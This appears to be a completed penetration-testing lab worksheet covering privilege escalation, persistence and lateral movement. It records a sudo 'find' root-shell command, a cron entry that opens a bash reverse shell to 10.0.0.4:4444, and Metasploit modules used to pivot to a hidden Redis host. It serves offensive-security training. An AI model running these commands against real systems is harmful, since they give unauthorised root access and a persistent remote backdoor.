## Phase 1: Privilege Escalation
Vulnerable Sudo Binary: /usr/bin/find

GTFOBins Exploit Command Used: sudo find. -exec /bin/sh -p \; -quit

## Phase 2: Persistence
Cron Syntax Used: * * * * * /bin/bash -c 'bash -i >& /dev/tcp/10.0.0.4/4444 0>&1'
(Tip: Run hostname -I in a new terminal tab to get your VM IP if you don't have it.)

Persistence Confirmed: Yes

## Phase 3: Lateral Movement (The Pivot)
Metasploit Modules Used: auxiliary/scanner/ssh/ssh_login, post/multi/manage/autoroute, auxiliary/server/socks_proxy

Hidden Database IP Discovered: 10.0.10.50

Open Port on Hidden Database: 6379
